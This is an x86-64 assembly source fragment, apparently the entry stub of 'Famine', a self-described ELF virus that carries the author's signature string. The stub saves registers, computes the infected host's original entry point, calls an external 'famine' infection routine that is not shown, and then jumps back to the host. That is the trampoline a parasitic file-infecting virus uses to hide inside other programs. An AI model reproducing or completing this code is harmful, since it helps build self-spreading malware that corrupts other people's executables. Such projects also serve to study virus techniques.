global _start:function
global signature:data
global payloadEntry:data
extern famine
section .text

exit:
			mov rax, 60
			mov rdi, 0
			syscall

_start:
			push rdi
			push rsi
			push rcx
			push rdx
	.findEntryAddress:
        ; Get host entry
            lea rax, [rel _start]
            sub rax, [rel payloadEntry]
            add rax, [rel hostEntry]
            push rax
	.callFamine:
			call famine
	.jumpToEntry:
			pop rax
			pop rdx
			pop rcx
			pop rsi
			pop rdi
			jmp rax

data:
	signature: db "Famine v1.0 (c)oded by tblaudez", 0x0
    payloadEntry: dq _start
    hostEntry: dq exit